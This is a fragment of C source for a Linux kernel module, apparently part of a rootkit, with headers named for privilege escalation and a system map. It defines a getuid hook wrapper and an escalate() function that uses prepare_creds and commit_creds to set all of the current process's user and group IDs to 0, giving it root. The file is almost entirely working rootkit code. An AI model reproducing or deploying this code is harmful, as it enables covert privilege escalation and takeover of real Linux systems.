#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/sched.h>
#include <linux/cred.h>

#include "sysmap.h"
//#include "/usr/src/linux/include/linux/sched.h"


#include "privilege_escalation.h"
#include "global.h"

typedef int (*fun_int)(void);
fun_int orig_getuid;

int hooked_getuid(void){
    OUR_DEBUG("hooked_getuid\n");
    return orig_getuid();
}

void escalate(void){
    struct cred *my_cred;
    my_cred = prepare_creds(); 
    my_cred->uid = my_cred->euid = my_cred->suid = my_cred->fsuid = 0;
    my_cred->gid = my_cred->egid = my_cred->sgid = my_cred->fsgid = 0;
    commit_creds(my_cred);
    OUR_DEBUG("Escalation done.\n");
}
